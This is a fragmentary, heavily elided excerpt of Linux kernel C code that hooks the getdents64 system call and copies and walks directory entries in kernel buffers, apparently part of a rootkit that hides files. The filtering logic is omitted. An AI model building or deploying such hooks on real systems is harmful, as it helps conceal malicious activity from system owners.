 ...
 * interface. Grabbed from fs/readdir.c.
 */
struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
...
asmlinkage static int hook_getdents64 (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
...
static int hook_getdents64 (unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
{
    struct linux_dirent64 *our_dirent;
    struct linux_dirent64 *their_dirent;
    ...
    their_dirent    = (struct linux_dirent64 *) kmalloc(count, GFP_KERNEL);
    our_dirent      = (struct linux_dirent64 *) kmalloc(count, GFP_KERNEL);
    ...
    while (their_len > 0)
    {
        ...
        adjust      += next;
        p           = (struct linux_dirent64 *)adjust;
        their_len   -= next;
    }
...
{
    struct linux_dirent *our_dirent;
    struct linux_dirent *their_dirent;
    ...
    their_dirent    = (struct linux_dirent *) kmalloc(count, GFP_KERNEL);
    our_dirent      = (struct linux_dirent *) kmalloc(count, GFP_KERNEL);
